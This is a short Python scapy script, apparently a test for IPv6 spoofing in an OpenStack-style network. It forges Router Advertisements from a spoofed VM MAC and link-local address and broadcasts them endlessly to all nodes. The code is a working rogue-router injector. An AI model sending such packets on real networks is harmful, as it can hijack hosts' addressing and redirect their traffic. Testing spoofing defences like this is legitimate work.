#!/usr/bin/python

# http://packetlife.net/blog/2009/feb/2/ipv6-neighbor-spoofing/

from scapy.all import *
import time

# for dhcp: we must have conf.iface been set, no matter eth0, eth1, br-ex,
#     or br-eth1 without setting this, the discovery request will use local
#     ip to send, not 0.0.0.0, don't know the reason yet
# for arp: we nedd make sure the interface we are using is in the same
#     subnet to arp requestor
conf.iface = 'eth1'

# send dhcp-discovery
conf.checkIPaddr = False

vm_src="6e:a1:42"

src_base="fa:16:3e:"
src=src_base + vm_src
lla="fe80::f816:3eff:fe"+vm_src[:5]+vm_src[-2:]

ether=Ether(src=src,dst="33:33:00:00:00:01")

plen=64

ipv6=IPv6(nh=58, src=lla, dst='ff02::1', version=6L, hlim=255, plen=plen, fl=0L, tc=0L)

ra=ICMPv6ND_RA(code=0, type=134, chlim=64)

prefix=ICMPv6NDOptPrefixInfo(type=3, len=4, L=1, A=1, prefixlen=0x40, validlifetime=0x3840, preferredlifetime=0x1c20, prefix='fdad:a0f9:c593::')
#prefix2=ICMPv6NDOptPrefixInfo(type=3, len=4, L=1, A=1, prefixlen=0x40, validlifetime=0x3840, preferredlifetime=0x1c20, prefix='fdad:a0f9:a012::')

mtu=ICMPv6NDOptMTU(mtu=1450)

lla=ICMPv6NDOptSrcLLAddr(type=1, len=1, lladdr=src)

#(ether/ipv6/ra/prefix/prefix2/mtu/lla).display()
(ether/ipv6/ra/prefix/mtu/lla).display()

#sendp(ether/ipv6/ra/prefix/prefix2/mtu/lla, iface="ppp", loop=1, inter=2)
sendp(ether/ipv6/ra/prefix/mtu/lla, iface="ppp", loop=1, inter=2)
